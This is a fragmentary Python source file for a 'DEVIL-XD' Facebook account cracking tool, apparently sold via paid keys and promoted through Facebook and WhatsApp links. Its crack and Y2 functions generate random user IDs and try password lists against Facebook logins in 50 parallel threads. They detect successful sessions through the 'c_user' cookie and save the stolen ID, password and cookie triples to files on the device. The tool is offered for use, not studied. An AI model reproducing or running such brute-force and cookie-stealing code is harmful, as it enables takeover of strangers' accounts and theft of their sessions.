...
os.system("xdg-open https://www.facebook.com/kabsundisb?mibextid=ZbWKwL")
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[DEVIL-XD')
...
def banner():
    ...
    \033[38;5;46m║ ║ \033[30;1m██    ██║ \033[38;5;46m║\x1b[38;5;196m ██    ██║\033[38;5;46m🦋⃟DEVIL✮⃝OMI𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m ██    ██║ \033[38;5;46m║\x1b[38;5;196m ██    ██  ║\033[38;5;46m🦋⃟DEVIL✮⃝OMI𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m ██    ██ ║ \033[38;5;46m║\x1b[38;5;196m██    ██║\033[38;5;46m🦋⃟DEVIL✮⃝OMI𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m  ██  ██║ \033[38;5;46m║\x1b[38;5;196m  ██    ██║\033[38;5;46m🦋⃟DEVIL✮⃝OMI𝄟⃝║
    \033[38;5;46m║ ║\033[30;1m   ████ ║ \033[38;5;46m║\x1b[38;5;196m  ██████  ║\033[38;5;46m🦋⃟DEVIL✮⃝OMI𝄟⃝║
...
#DEVIL_NAME=input(f'\033[1;92m[\033[1;31m\033[1;92m]\033[0;92m YOUR NAME :\x1b[1;96m ')
#--------------------[ BAGIAN-MASUK ]--------------#
...
def menu():
	...
	_DEVIL_(f'\033[1;92m[\033[1;34m1\033[38;5;46m]𝐄𝐇𝐂 𝐖𝐎𝐑𝐊_____𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐄 \x1b[38;5;196m𝐖𝐎𝐑𝐊𝐈𝐍𝐆')
	_DEVIL_(f'\033[1;92m[\033[1;92m2\033[38;5;46m[𝐄𝐇𝐂 𝐖𝐎𝐑𝐊______𝐑𝐀𝐍𝐃𝐎𝐌  𝐂𝐋𝐎𝐍𝐄 \x1b[38;5;196m𝐖𝐎𝐑𝐊𝐈𝐍𝐆')
	_DEVIL_(f'\033[1;92m[\033[1;92m3\033[38;5;46m[𝐄𝐇𝐂 𝐖𝐎𝐑𝐊_______𝐄𝐌𝐀𝐈𝐋 𝐂𝐋𝐎𝐍𝐄 \x1b[38;5;196m𝐖𝐎𝐑𝐊𝐈𝐍𝐆')
	_DEVIL_(f'[\033[1;92m\033[1;34m4\033[38;5;46m]𝐄𝐌𝐑𝐀𝐍 𝐂𝐘𝐁𝐄𝐑____\x1b[38;5;196m𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐌𝐄')
	_DEVIL_(f'\033[1;92m[\033[1;34m0\033[38;5;46m]𝐄𝐗𝐈𝐓')
	_____DEVIL_____ = input('\033[1;92m\033[38;5;46m𝐂𝐇𝐎𝐎𝐒𝐄 :\x1b[1;92m ')
	if _____DEVIL_____ in ['1']:
		C1()
	if _____DEVIL_____ in ['2']:
		Y2()
	if _____DEVIL_____ in ['3']:
		BER()
	if _____DEVIL_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/groups/2740586426083467/permalink/2740591956082914/?mibextid=Nif5oz")
	if _____DEVIL_____ in ['0']:
		exit()
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(DEVIL_NAME))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [DEVIL] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mDEVIL-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				#open('/sdcard/'+DEVIL-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				#print ()
				print(f'\r\x1b[1;92m [\033[1;92mDEVIL-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/DEVIL-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as DEVIL:
        clear()
        tl = str(len(user))      
        ...
        for love in user:
            ...
            uid = code+love
            DEVIL.submit(alamin,uid,pwv,tl)
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mDEVIL-EHC\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/DEVIL-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[DEVIL.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/DEVIL-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        ...
        sys.stdout.write('\r%s[DEVIL-EHC]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    ...
    try:
        for ps in pwv:
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mDEVIL-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/DEVIL-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+9710569549857?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20AlAmin%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://github.com/Max-fro-man/DEVIL-AFROBAL/blob/main/Afroveal.txt').text
    if key1 in r:
        ...
        os.system('am start https://wa.me/+9710569549857?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20DEVIL%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex() 
##################
